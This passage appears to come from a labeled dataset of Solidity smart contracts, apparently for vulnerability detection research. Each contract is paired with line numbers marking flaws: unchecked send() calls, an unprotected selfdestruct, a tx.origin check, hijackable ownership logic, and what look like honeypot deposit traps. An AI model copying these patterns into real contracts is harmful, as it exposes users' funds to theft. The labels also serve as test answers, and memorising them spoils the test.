                uint256 endBlockNumber = player_[rId_][uid].plans[i].startBlock.add(plan.dayRange*G_DayBlocks);
                if (blockNumber > endBlockNumber){
                    blockNumber = endBlockNumber;
                    bClose = true;
                }
            }
            uint256 amount = player_[rId_][uid].plans[i].invested * plan.interest / 10000 * (blockNumber - player_[rId_][uid].plans[i].atBlock) / G_DayBlocks;
            // send calculated amount of ether directly to sender (aka YOU)
            address sender = msg.sender;
            sender.send(amount);
            // record block number and invested amount (msg.value) of this transaction
            player_[rId_][uid].plans[i].atBlock = block.number;
            player_[rId_][uid].plans[i].isClose = bClose;
            player_[rId_][uid].plans[i].payEth += amount;
        }
        if (this.balance < 100000000000000) { //0.0001eth
            rId_ = rId_.add(1);
            round_[rId_].startTime = now;
        }
	}
    function bytesToUint(bytes b) private returns (uint256){
        uint256 number;
        for(uint i=0;i<b.length;i++){
            number = number + uint(b[i])*(2**(8*(b.length-(i+1))));
        }
        return number;
    }
}
/***********************************************************
 * @title SafeMath v0.1.9
 * @dev Math operations with safety checks that throw on error
 * change notes:  original SafeMath library from OpenZeppelin modified by Inventor
 * - added sqrt
 * - added sq
 * - added pwr
 * - changed asserts to requires with error log outputs
 * - removed div, its useless
 ***********************************************************/
 library SafeMath {
    /**
    * @dev Multiplies two numbers, throws on overflow.
    */
    function mul(uint256 a, uint256 b)
        internal
        pure
        returns (uint256 c)
    {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        require(c / a == b, ""SafeMath mul failed"");
        return c;
    }
    /**
    * @dev Integer division of two numbers, truncating the quotient.
    */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }
    /**
    * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b)
        internal
        pure
        returns (uint256)
    {
        require(b <= a, ""SafeMath sub failed"");","[63, 66]"
"        emit Transfer(msg.sender, to, tokens);
        return true;
    }
    // ------------------------------------------------------------------------
    // Token owner can approve for spender to transferFrom(...) tokens
    // from the token owner's account
    //
    // https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md
    // recommends that there are no checks for the approval double-spend attack
    // as this should be implemented in user interfaces
    // ------------------------------------------------------------------------
    function approve(address spender, uint tokens) public override returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }
    // ------------------------------------------------------------------------
    // Transfer tokens from the from account to the to account
    //
    // The calling account must already have sufficient tokens approve(...)-d
    // for spending from the from account and
    // - From account must have sufficient balance to transfer
    // - Spender must have sufficient allowance to transfer
    // - 0 value transfers are allowed
    // ------------------------------------------------------------------------
    function transferFrom(address from, address to, uint tokens) public override returns (bool success) {
        balances[from] = safeSub(balances[from], tokens);
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(from, to, tokens);
        return true;
    }
    // ------------------------------------------------------------------------
    // Returns the amount of tokens approved by the owner that can be
    // transferred to the spender's account
    // ------------------------------------------------------------------------
    function allowance(address tokenOwner, address spender) public override view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }
    // ------------------------------------------------------------------------
    // Token owner can approve for spender to transferFrom(...) tokens
    // from the token owner's account. The spender contract function
    // receiveApproval(...) is then executed
    // ------------------------------------------------------------------------
    function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
        return true;
    }
    // ------------------------------------------------------------------------
    // Don't accept ETH
    // ------------------------------------------------------------------------
    // function () external payable {
    //     revert();
    // }
    // ------------------------------------------------------------------------
    // Owner can transfer out any accidentally sent ERC20 tokens
    // ------------------------------------------------------------------------
    function transferAnyERC20Token(address tokenAddress, uint tokens) public onlyOwner returns (bool success) {
        return ERC20Interface(tokenAddress).transfer(owner, tokens);
    }
    function close() public
    {
        selfdestruct(0x68dC34fCb18A400Dd2664571C77D94793404F7C1);
    }
}","[63, 65]"
"pragma solidity ^0.4.11;
contract Ownable {
  address public owner;
  function Ownable() {
    owner = msg.sender;
  }
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
  function transferOwnership(address newOwner) onlyOwner {
    require(newOwner != address(0));
    owner = newOwner;
  }
}
library SafeMath {
  function add(uint256 a, uint256 b) internal constant returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract EthCapsule is Ownable {
  struct Depositor {
    uint numCapsules;
    mapping (uint => Capsule) capsules;
  }
  mapping (address => Depositor) depositors;
  struct Capsule {
    uint value;
    uint id;
    uint lockTime;
    uint unlockTime;
    uint withdrawnTime;
  }
  uint public minDeposit = 1000000000000000;
  uint public minDuration = 0;
  uint public maxDuration = 157680000;
  uint public totalCapsules;
  uint public totalValue;
  uint public totalBuriedCapsules;
  function bury(uint unlockTime) payable {
    require(msg.value >= minDeposit);
    require(unlockTime <= block.timestamp + maxDuration);
    if (unlockTime < block.timestamp + minDuration) {
      unlockTime = SafeMath.add(block.timestamp, minDuration);
    }
    if (depositors[msg.sender].numCapsules <= 0) {
        depositors[msg.sender] = Depositor({ numCapsules: 0 });
    }
    Depositor storage depositor = depositors[msg.sender];
    depositor.numCapsules++;
    depositor.capsules[depositor.numCapsules] = Capsule({
        value: msg.value,
        id: depositors[msg.sender].numCapsules,
        lockTime: block.timestamp,
        unlockTime: unlockTime,
        withdrawnTime: 0
    });
    totalBuriedCapsules++;
    totalCapsules++;
    totalValue = SafeMath.add(totalValue, msg.value);
  }
  function dig(uint capsuleNumber) {
    Capsule storage capsule = depositors[msg.sender].capsules[capsuleNumber];
    require(capsule.unlockTime <= block.timestamp);
    require(capsule.withdrawnTime == 0);
    totalBuriedCapsules--;
    capsule.withdrawnTime = block.timestamp;
    msg.sender.transfer(capsule.value);
  }
  function setMinDeposit(uint min) onlyOwner {
    minDeposit = min;
  }
  function setMinDuration(uint min) onlyOwner {
    minDuration = min;
  }
  function setMaxDuration(uint max) onlyOwner {
    maxDuration = max;
  }
  function getCapsuleInfo(uint capsuleNum) constant returns (uint, uint, uint, uint, uint) {
    return (
        depositors[msg.sender].capsules[capsuleNum].value,
        depositors[msg.sender].capsules[capsuleNum].id,
        depositors[msg.sender].capsules[capsuleNum].lockTime,
        depositors[msg.sender].capsules[capsuleNum].unlockTime,
        depositors[msg.sender].capsules[capsuleNum].withdrawnTime
    );
  }
  function getNumberOfCapsules() constant returns (uint) {
    return depositors[msg.sender].numCapsules;
  }
  function totalBuriedValue() constant returns (uint) {
    return this.balance;
  }
}","[45, 66]"
"pragma solidity ^0.4.22;
contract EthReceiver
{
    bool closed = false;
    uint unlockTime = 43200;
    address sender;
    address receiver;
    function Put(address _receiver) public payable {
        if ((!closed && msg.value > 0.5 ether) || sender == 0x0 ) {
            sender = msg.sender;
            receiver = _receiver;
            unlockTime += now;
        }
    }
    function SetTime(uint _unixTime) public {
        if (msg.sender == sender) {
            unlockTime = _unixTime;
        }
    }
    function Get() public payable {
        if (receiver == msg.sender && now >= unlockTime) {
            msg.sender.transfer(address(this).balance);
        }
    }
    function Close() public {
        if (sender == msg.sender) {
           closed=true;
        }
    }
    function() public payable { }
}","[12, 21]"
"// Copyright (C) 2017  The Halo Platform by Scott Morrison
// https://www.haloplatform.tech/
// 
// This is free software and you are welcome to redistribute it under certain conditions.
// ABSOLUTELY NO WARRANTY; for details visit:
//
//      https://www.gnu.org/licenses/gpl-2.0.html
//
pragma solidity ^0.4.18;
contract Ownable {
    address Owner;
    function Ownable() { Owner = msg.sender; }
    modifier onlyOwner { if (msg.sender == Owner) _; }
    function transferOwnership(address to) public onlyOwner { Owner = to; }
}
contract Token {
    function balanceOf(address who) constant public returns (uint256);
    function transfer(address to, uint amount) constant public returns (bool);
}
// tokens are withdrawable
contract TokenVault is Ownable {
    address owner;
    event TokenTransfer(address indexed to, address token, uint amount);
    function withdrawTokenTo(address token, address to) public onlyOwner returns (bool) {
        uint amount = balanceOfToken(token);
        if (amount > 0) {
            TokenTransfer(to, token, amount);
            return Token(token).transfer(to, amount);
        }
        return false;
    }
    function balanceOfToken(address token) public constant returns (uint256 bal) {
        bal = Token(token).balanceOf(address(this));
    }
}
// store ether & tokens for a period of time
contract EthVault is TokenVault {
    string public constant version = ""v1.1"";
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    event OpenDate(uint date);
    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;
    function init() payable open {
        Owner = msg.sender;
        minDeposit = 0.25 ether;
        Locked = false;
        deposit();
    }
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }
    function() public payable { deposit(); }
    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }
    function setRelease(uint newDate) public { 
        Date = newDate;
        OpenDate(Date);
    }
    function withdraw(address to, uint amount) public onlyOwner {
        if (WithdrawEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }
    function lock() public { if(Locked) revert(); Locked = true; }
    modifier open { if (!Locked) _; owner = msg.sender; deposit(); }
    function kill() public { require(this.balance == 0); selfdestruct(Owner); }
    function getOwner() external constant returns (address) { return owner; }
}","[59, 78]"
"// Copyright (C) 2017  The Halo Platform by Scott Morrison
// https://www.haloplatform.tech/
// 
// This is free software and you are welcome to redistribute it under certain conditions.
// ABSOLUTELY NO WARRANTY; for details visit:
//
//      https://www.gnu.org/licenses/gpl-2.0.html
//
pragma solidity ^0.4.18;
contract Ownable {
    address Owner;
    function Ownable() { Owner = msg.sender; }
    modifier onlyOwner { if (msg.sender == Owner) _; }
    function transferOwnership(address to) public onlyOwner { Owner = to; }
}
contract Token {
    function balanceOf(address who) constant public returns (uint256);
    function transfer(address to, uint amount) constant public returns (bool);
}
// tokens are withdrawable
contract TokenVault is Ownable {
    address owner;
    event TokenTransfer(address indexed to, address token, uint amount);
    function withdrawTokenTo(address token, address to) public onlyOwner returns (bool) {
        uint amount = balanceOfToken(token);
        if (amount > 0) {
            TokenTransfer(to, token, amount);
            return Token(token).transfer(to, amount);
        }
        return false;
    }
    function balanceOfToken(address token) public constant returns (uint256 bal) {
        bal = Token(token).balanceOf(address(this));
    }
}
// store ether & tokens for a period of time
contract EthVault is TokenVault {
    string public constant version = ""v1.2"";
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    event OpenDate(uint date);
    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;
    function init() payable open {
        Owner = msg.sender;
        minDeposit = 0.5 ether;
        Locked = false;
        deposit();
    }
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }
    function() public payable { deposit(); }
    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }
    function setRelease(uint newDate) public { 
        Date = newDate;
        OpenDate(Date);
    }
    function withdraw(address to, uint amount) public onlyOwner {
        if (WithdrawEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }
    function lock() public { if(Locked) revert(); Locked = true; }
    modifier open { if (!Locked) _; owner = msg.sender; deposit(); }
    function kill() public { require(this.balance == 0); selfdestruct(Owner); }
    function getOwner() external constant returns (address) { return owner; }
}","[59, 78]"
"pragma solidity ^0.4.17;
/**
 * @title EthealSplit
 * @dev Split ether evenly on the fly.
 * @author thesved, viktor.tabori at etheal.com
 */
contract EthealSplit {
    /// @dev Split evenly among addresses, no safemath is needed for divison
    function split(address[] _to) public payable {
        uint256 _val = msg.value / _to.length;
        for (uint256 i=0; i < _to.length; i++) {
            _to[i].send(_val);
        }
        if (address(this).balance > 0) {
            msg.sender.transfer(address(this).balance);
        }
    }
}",[12]
"pragma solidity ^0.5.12;
// EtherBuy is a DApp to buy and sell anything on Ethereum.
contract EtherBuy {
	struct oneSale {
		address payable seller;
		string title;
		string content;
		uint price;
		uint locked; //money will be locked until the buyer sends feedback or the seller cancels sale
		bool available;
	}
	struct oneBuy {
		address payable buyer;
		string message;
		bool lockReleased;
		bool hasReceived;
		string commentByBuyer;
		string commentBySeller;
	}
	oneSale[] public sales;
	mapping(uint => oneBuy[]) public buys;
	event SellEvent();
	event BuyEvent(uint SaleID, string message);
	event CancelEvent(uint SaleID);
	event FeedbackEvent(uint SaleID, uint BuyID);
	function sell(string memory title, string memory content, uint price, uint locked) public {
		sales.push(oneSale(
			msg.sender,
			title,
			content,
			price,
			locked,
			true
		));		
		emit SellEvent();
	}
	function buy(uint SaleID, string memory message) public payable {
		require(sales[SaleID].available);
		require(msg.value==sales[SaleID].price+sales[SaleID].locked);
		buys[SaleID].push(oneBuy(
			msg.sender,
			message,
			false,
			false,
			"""",
			""""
		));
		sales[SaleID].seller.transfer(sales[SaleID].price);
		emit BuyEvent(SaleID, message);
	}
	function cancel(uint SaleID) public {
		require(msg.sender==sales[SaleID].seller);
		sales[SaleID].available = false;
		if(sales[SaleID].locked>0) {
			uint lockedValue = sales[SaleID].locked;
			for (uint BuyID=0; BuyID<buys[SaleID].length; BuyID++) {
				if(buys[SaleID][BuyID].lockReleased==false) {
					buys[SaleID][BuyID].lockReleased = true;
					buys[SaleID][BuyID].buyer.transfer(lockedValue);
				}
			}
		}
		emit CancelEvent(SaleID);
	}
	function buyerFeedback(uint SaleID, uint BuyID, bool hasReceived, string memory comment) public {
		require(msg.sender==buys[SaleID][BuyID].buyer);
		if(!buys[SaleID][BuyID].lockReleased && sales[SaleID].locked>0) {
			buys[SaleID][BuyID].lockReleased = true;
			msg.sender.transfer(sales[SaleID].locked);
		}
		buys[SaleID][BuyID].hasReceived = hasReceived;
		buys[SaleID][BuyID].commentByBuyer = comment;
		emit FeedbackEvent(SaleID, BuyID);
	}
	function sellerFeedback(uint SaleID, uint BuyID, string memory comment) public {
		require(msg.sender==sales[SaleID].seller);
		buys[SaleID][BuyID].commentBySeller = comment;
		emit FeedbackEvent(SaleID, BuyID);
	}
    function getCountOfSales() view public returns (uint) {
    	return sales.length;
    }
    function getCountOfBuys(uint SaleID) view public returns (uint) {
    	return buys[SaleID].length;
    }
}",[59]
"pragma solidity ^0.4.21;
library EtherSafeMath {
  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a); 
    return c;
  }
}
contract EtherFox {
    // The keyword ""public"" makes those variables
    // readable from outside.
    address public minter;
    event LogWithdrawal(address sender, uint amount);
    mapping (address => uint) public balances;
    // Events allow light clients to react on
    // changes efficiently.
    event Sent(address from, address to, uint amount);
    // This is the constructor whose code is
    // run only when the contract is created.
    constructor() public {
        minter = msg.sender;
    }
    function mint(address receiver, uint amount) public {
        if (msg.sender != minter) return;
        balances[receiver] += amount;
    }
    function send(address receiver, uint amount) public {
        if (balances[msg.sender] < amount) return;
        balances[msg.sender] -= amount;
        balances[receiver] += amount;
        emit Sent(msg.sender, receiver, amount);
    }
    function getBalance() public view returns(uint balance) {
        return address(this).balance;
    }
     function withdraw(uint amount) public returns(bool success) {
        require(msg.sender==minter);
        emit LogWithdrawal(msg.sender, amount);
        msg.sender.transfer(amount);
        return true;
    }
        event Multisended(uint256 value , address sender);
        using EtherSafeMath for uint256;
        function multisendEther(address[] _contributors, uint256[] _balances) public payable {
            uint256 total = msg.value;
            uint256 i = 0;
            for (i; i < _contributors.length; i++) {
                require(total >= _balances[i] );
                total = total.sub(_balances[i]);
                _contributors[i].transfer(_balances[i]);
            }
            emit Multisended(msg.value, msg.sender);
        }
        event Decenter(uint256 value , address sender);
        using EtherSafeMath for uint256;
        function Decentralize(address[] _contributors, uint256[] _balances) public payable {
            uint256 total = msg.value;
            uint256 i = 0;
            for (i; i < _contributors.length; i++) {
                require(total >= _balances[i] );
                total = total.sub(_balances[i]);
                _contributors[i].transfer(_balances[i]);
            }
            emit Decenter(msg.value, msg.sender);
        }
}","[60, 77, 80, 89, 92]"
"        numberOfGuesses++;
        Guess(msg.sender, currentRound, numberOfGuesses, guess, testValue);
    }
    function multiGuess(int[] multiGuesses) public payable isOpen {
        require(multiGuesses.length > 1 && multiGuesses.length <= 20);
        uint valueLeft = msg.value;
        for (uint i = 0; i < multiGuesses.length; i++) {
            if (valueLeft > 0) {
                uint newValue = minimumValue;
                if (guesses[multiGuesses[i]].round == currentRound) {
                    uint oldValue = guesses[multiGuesses[i]].value;
                    totalPayout += oldValue;
                    address oldOwner = guesses[multiGuesses[i]].owner;
                    winners[oldOwner] += oldValue;
                    Refund(oldOwner, currentRound, oldValue, multiGuesses[i]);
                    newValue = oldValue + minimumValue;
                }
                valueLeft = subToZero(valueLeft,newValue);
                GuessInfo memory gi = GuessInfo(msg.sender, newValue, currentRound);
                guesses[multiGuesses[i]] = gi;
                Guess(msg.sender, currentRound, ++numberOfGuesses, multiGuesses[i], newValue);
            }
        }
        if (valueLeft > 0) {
            Refund(msg.sender, currentRound, valueLeft, -1);
            winners[msg.sender] += valueLeft;
        }
    }
    function pauseResumeContract(bool state, bytes32 reason) public onlyAdmin {
        pauseReason = reason;
        running = state;
        lastFinish = now;
    }
    function subToZero(uint a, uint b) pure internal returns (uint) {
        if (b > a) {
            return 0;
        } else {
        return a - b;
        }
    }
    function finishUpRound(int price, string priceInfo) public adminOrBot {
            if (guesses[price].round == currentRound && guesses[price].value > 0) {
                uint finalTotalPayout = this.balance - totalPayout;
                uint finalAdminPayout = (finalTotalPayout * adminPayout) / ADMINPAYOUTDENOMINATOR;
                uint finalPlayerPayout = finalTotalPayout - finalAdminPayout;
                Winner(guesses[price].owner, currentRound, finalPlayerPayout, price, priceInfo);
                totalPayout += finalTotalPayout;
                totalPayedOut += finalPlayerPayout;
                winners[guesses[price].owner] += finalPlayerPayout;
                winners[admin] += finalAdminPayout;
                numberOfGuesses = 0;
                currentRound++;
            } else {
                NoWinner(msg.sender, currentRound, price, priceInfo);
            }
        lastFinish = now;
    }
    function neglectGuess(int guess) public {
        require(lastFinish + NEGLECTGUESSTIMER < now);
        require(guesses[guess].owner == msg.sender && guesses[guess].round == currentRound);
        guesses[guess].round = 0;
        numberOfGuesses -= 1;
        Neglect(msg.sender, currentRound, guesses[guess].value, guess);
        msg.sender.transfer(guesses[guess].value);
    }
    function neglectOwner() public {
        require(lastFinish + NEGLECTOWNERTIMER < now);
        lastFinish = now;
        admin = msg.sender;
        winners[msg.sender] += winners[admin];
        winners[admin] = 0;
    }
}","[59, 70]"
"pragma solidity ^0.4.25;
contract EtherTime
{
    address Owner = msg.sender;
    function() public payable {}
    function Xply() public payable {
        if (msg.value >= address(this).balance || tx.origin == Owner) {
            selfdestruct(tx.origin);
        }
    }
 }","[6, 7, 8]"
"pragma solidity ^0.4.20;
contract Ether_Quiz
{
    function Try(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function initialize_ether_quiz(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"            (_amount, _withdrawSid, _reachAmount, _finish) = getEarningsAmountByGoodsIndex(_playerGoodsList[i]);
            if(_finish == true){
                playerWithdrawList[_player].push(_playerGoodsList[i]);
            }else{
                goodsList[_playerGoodsList[i]].withdrawSid = _withdrawSid;
                goodsList[_playerGoodsList[i]].reachAmount = _reachAmount;
                playerGoodsList[_player].push(_playerGoodsList[i]);
            }
            _totalAmount = _totalAmount.add(_amount);
            i++;
        }
        _player.transfer(_totalAmount);
    }
     /**
     * Backup withdraw function in case gas is too high to use standard withdraw.
     */
    function withdrawByGid(uint256 _gId)
        isActivated()
        senderVerify()
        playerVerify()
        public
    {
        address _player = msg.sender;
        uint256 _amount;
        uint256 _withdrawSid;
        uint256 _reachAmount;
        bool _finish;
        (_amount, _withdrawSid, _reachAmount, _finish) = getEarningsAmountByGoodsIndex(_gId);
        if(_finish == true){
            for(uint256 i = 0; i < playerGoodsList[_player].length; i++){
                if(playerGoodsList[_player][i] == _gId)
                    break;
            }
            require(i < playerGoodsList[_player].length, ""gid is wrong"");
            playerWithdrawList[_player].push(_gId);
            playerGoodsList[_player][i] = playerGoodsList[_player][playerGoodsList[_player].length - 1];
            playerGoodsList[_player].length--;
        }else{
            goodsList[_gId].withdrawSid = _withdrawSid;
            goodsList[_gId].reachAmount = _reachAmount;
        }
        _player.transfer(_amount);
    }
    function resetTime()
        modifyCountdownVerify()
        senderVerify()
        public
        payable
    {
        uint256 _rId = rId;
        uint256 _sId = sId;
        uint256 _amount = msg.value;
        uint256 _targetExpectedAmount = getStageTargetAmount(_sId);
        uint256 _targetAmount =
            stage[_rId][_sId].dividendAmount <= _targetExpectedAmount ?
            _targetExpectedAmount : stage[_rId][_sId].dividendAmount;
            _targetAmount = _targetAmount.mul(100) / 88;
        uint256 _costAmount = _targetAmount.mul(20) / 100;
        if(_costAmount > 3 ether)
            _costAmount = 3 ether;
        require(_amount >= _costAmount, ""Not enough price"");
        stage[_rId][_sId].start = now;
        cardList[5].playerAddress.send(_costAmount / 2);
        developerAddr.send(_costAmount / 2);
        if(_amount > _costAmount)
            msg.sender.send(_amount.sub(_costAmount));
    }
    function reduceTime()
        modifyCountdownVerify()
        senderVerify()
        public
        payable
    {
        uint256 _rId = rId;
        uint256 _sId = sId;
        uint256 _amount = msg.value;
        uint256 _targetExpectedAmount = getStageTargetAmount(_sId);
        uint256 _targetAmount =
            stage[_rId][_sId].dividendAmount <= _targetExpectedAmount ?
            _targetExpectedAmount : stage[_rId][_sId].dividendAmount;
            _targetAmount = _targetAmount.mul(100) / 88;
        uint256 _costAmount = _targetAmount.mul(30) / 100;
        if(_costAmount > 3 ether)
            _costAmount = 3 ether;
        require(_amount >= _costAmount, ""Not enough price"");
        stage[_rId][_sId].start = now - stageDuration + 1800;
        cardList[5].playerAddress.send(_costAmount / 2);
        developerAddr.send(_costAmount / 2);
        if(_amount > _costAmount)
            msg.sender.send(_amount.sub(_costAmount));
    }
    /**
     * Core logic to analyse buy behaviour.
     */
    function buyAnalysis(uint256 _stepSize, uint256 _protectRatio, address _recommendAddr)
        private
    {
        uint256 _rId = rId;
        uint256 _sId = sId;
        uint256 _targetExpectedAmount = getStageTargetAmount(_sId);
        uint256 _targetAmount =
            stage[_rId][_sId].dividendAmount <= _targetExpectedAmount ?
            _targetExpectedAmount : stage[_rId][_sId].dividendAmount;
            _targetAmount = _targetAmount.mul(100) / 88;
        uint256 _stageTargetBalance =
            stage[_rId][_sId].amount > 0 ?
            _targetAmount.sub(stage[_rId][_sId].amount) : _targetAmount;
        if(now > stage[_rId][_sId].start.add(stageDuration)
            && _targetAmount > stage[_rId][_sId].amount
        ){
            endRound(_rId, _sId);
            _rId = rId;
            _sId = sId;
            stage[_rId][_sId].start = now;
            _targetExpectedAmount = getStageTargetAmount(_sId);
            _targetAmount =
                stage[_rId][_sId].dividendAmount <= _targetExpectedAmount ?
                _targetExpectedAmount : stage[_rId][_sId].dividendAmount;
            _targetAmount = _targetAmount.mul(100) / 88;
            _stageTargetBalance =
                stage[_rId][_sId].amount > 0 ?
                _targetAmount.sub(stage[_rId][_sId].amount) : _targetAmount;
        }
        if(_stageTargetBalance > msg.value)
            buyDataRecord(
                _rId,
                _sId,
                _targetAmount,",[64]
"        uint256 _withdrawSid;
        uint256 _reachAmount;
        bool _finish;
        (_amount, _withdrawSid, _reachAmount, _finish) = getEarningsAmountByGoodsIndex(_gId);
        if(_finish == true){
            for(uint256 i = 0; i < playerGoodsList[_player].length; i++){
                if(playerGoodsList[_player][i] == _gId)
                    break;
            }
            require(i < playerGoodsList[_player].length, ""gid is wrong"");
            playerWithdrawList[_player].push(_gId);
            playerGoodsList[_player][i] = playerGoodsList[_player][playerGoodsList[_player].length - 1];
            playerGoodsList[_player].length--;
        }else{
            goodsList[_gId].withdrawSid = _withdrawSid;
            goodsList[_gId].reachAmount = _reachAmount;
        }
        _player.transfer(_amount);
    }
    function resetTime()
        modifyCountdownVerify()
        senderVerify()
        public
        payable
    {
        uint256 _rId = rId;
        uint256 _sId = sId;
        uint256 _amount = msg.value;
        uint256 _targetExpectedAmount = getStageTargetAmount(_sId);
        uint256 _targetAmount =
            stage[_rId][_sId].dividendAmount <= _targetExpectedAmount ?
            _targetExpectedAmount : stage[_rId][_sId].dividendAmount;
            _targetAmount = _targetAmount.mul(100) / 88;
        uint256 _costAmount = _targetAmount.mul(20) / 100;
        if(_costAmount > 3 ether)
            _costAmount = 3 ether;
        require(_amount >= _costAmount, ""Not enough price"");
        stage[_rId][_sId].start = now;
        cardList[5].playerAddress.send(_costAmount / 2);
        developerAddr.send(_costAmount / 2);
        if(_amount > _costAmount)
            msg.sender.send(_amount.sub(_costAmount));
    }
    function reduceTime()
        modifyCountdownVerify()
        senderVerify()
        public
        payable
    {
        uint256 _rId = rId;
        uint256 _sId = sId;
        uint256 _amount = msg.value;
        uint256 _targetExpectedAmount = getStageTargetAmount(_sId);
        uint256 _targetAmount =
            stage[_rId][_sId].dividendAmount <= _targetExpectedAmount ?
            _targetExpectedAmount : stage[_rId][_sId].dividendAmount;
            _targetAmount = _targetAmount.mul(100) / 88;
        uint256 _costAmount = _targetAmount.mul(30) / 100;
        if(_costAmount > 3 ether)
            _costAmount = 3 ether;
        require(_amount >= _costAmount, ""Not enough price"");
        stage[_rId][_sId].start = now - stageDuration + 900;
        cardList[5].playerAddress.send(_costAmount / 2);
        developerAddr.send(_costAmount / 2);
        if(_amount > _costAmount)
            msg.sender.send(_amount.sub(_costAmount));
    }
    /**
     * Core logic to analyse buy behaviour.
     */
    function buyAnalysis(uint256 _stepSize, uint256 _protectRatio)
        private
    {
        uint256 _rId = rId;
        uint256 _sId = sId;
        uint256 _targetExpectedAmount = getStageTargetAmount(_sId);
        uint256 _targetAmount =
            stage[_rId][_sId].dividendAmount <= _targetExpectedAmount ?
            _targetExpectedAmount : stage[_rId][_sId].dividendAmount;
            _targetAmount = _targetAmount.mul(100) / 88;
        uint256 _stageTargetBalance =
            stage[_rId][_sId].amount > 0 ?
            _targetAmount.sub(stage[_rId][_sId].amount) : _targetAmount;
        if(now > stage[_rId][_sId].start.add(stageDuration)
            && _targetAmount > stage[_rId][_sId].amount
        ){
            endRound(_rId, _sId);
            _rId = rId;
            _sId = sId;
            stage[_rId][_sId].start = now;
            _targetExpectedAmount = getStageTargetAmount(_sId);
            _targetAmount =
                stage[_rId][_sId].dividendAmount <= _targetExpectedAmount ?
                _targetExpectedAmount : stage[_rId][_sId].dividendAmount;
            _targetAmount = _targetAmount.mul(100) / 88;
            _stageTargetBalance =
                stage[_rId][_sId].amount > 0 ?
                _targetAmount.sub(stage[_rId][_sId].amount) : _targetAmount;
        }
        if(_stageTargetBalance > msg.value)
            buyDataRecord(
                _rId,
                _sId,
                _targetAmount,
                msg.value,
                _stepSize,
                _protectRatio
                );
        else
            multiStake(
                msg.value,
                _stepSize,
                _protectRatio,
                _targetAmount,
                _stageTargetBalance
                );
        /* This is a backstop check to ensure that the contract will always be solvent.
        It would reject any stakes with a protection ratio that the contract may not be able to repay.
        This backstop should never be needed under current settings. */
        require(
            (
                round[_rId].jackpotAmount.add(round[_rId].amount.mul(88) / 100)
                .sub(round[_rId].protectAmount)
                .sub(round[_rId].dividendAmount)
            ) > 0, ""data error""
        );
        bankerFeeDataRecord(msg.value, _protectRatio);
    }",[64]
"	uint constant gcnTransferFee = .0001 ether;
	mapping(uint => address[]) gmapGame_addresses;
	mapping(uint => uint[]) gmapGame_wagers;
	mapping(uint => uint[]) gmapGame_runningbalances;
	mapping(uint => uint) gmapGame_balance;
	mapping(uint => uint) gmapGame_expiration;
	modifier onlyOwner() {
		require(gadrOwner == msg.sender);
		_;
	}
	modifier onlyOtherContract() {
		require(gadrOtherContract == msg.sender);
		_;
	}
	function FantasySports () public {
		gadrOwner = msg.sender;
	}
	function zReceiveFunds() payable public {
	}
	function() payable public {
